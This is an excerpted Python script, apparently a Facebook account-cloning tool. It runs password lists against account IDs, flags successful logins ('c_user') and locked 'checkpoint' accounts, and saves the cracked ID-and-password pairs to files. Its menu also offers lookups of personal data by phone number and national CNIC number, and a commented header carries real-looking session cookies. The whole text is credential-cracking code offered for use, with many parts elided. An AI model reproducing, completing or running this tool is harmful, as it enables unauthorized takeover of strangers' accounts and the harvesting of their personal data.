...
def menu():
			...
			os.system('clear')
			print(logo)
			print('\x1b[1;92m[1] File Cloning menu')
			print('\x1b[1;93m[2] Pak Random Cloning menu')
			print('\x1b[1;94m[3] BD  Random Cloning menu')
			print('\x1b[1;95m[4] Random Choice Pass ')
			print('\x1b[1;96m[5] Get any  number data')
			print('\x1b[1;97m[6] Get any CNIC number data')
			print('\x1b[1;98m[7] Follow me on Facebook')
			...
			if riaz in ['1','01']:
				...
				linex()
				print(' Example : /sdcard/SHAHZAD.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.SHAHZAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[ANEES-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/ANEES-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[ANEES-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ANEES-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.SHAZAD\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\033[1;92m[SHAHZAD-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/SHAHZAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\33[1;91m[ANEES-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/ANEES-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def fcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=aFHJY0tCbgYaHRNDICFw8jsv; sb=aFHJY3HI1DJKXMr_5wNbz7wE; locale=en_GB; vpd=v1%3B708x360x3; m_pixel_ratio=3; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZabHVIZGVQamFxd2xaNlB1VjRVbFhsQlA5REdMRjBBckFtYzJ0dGlRaW5MWkhqRExGUGdHSGZORHZJRTJPeXJQVSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpsdUhkZVBqYXF3bFo2UHVWNFVsWGxCUDlER0xGMEFyQW1jMnR0aVFpbkxaSGpETEZQZ0dIZk5EdklFMk95clBVIiwicyI6Im0ifQ%3D%3D; wd=980x1927; fr=0E5jR7Ou35DythN3G.AWXioqQeJ0xZ8wbaQDPVXriMH74.BjyVFo.gz.AAA.0.0.Bjy6Ur.AWWPORWIF0w',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[SHAHZAD-OK] '+cid+' | '+ps+'\033[1;32m')
				open('SHAHZAD-ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[SHAHZAD-CP] '+cid+' | '+ps+'\33[0;97m')
				open('SHAHZAD-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
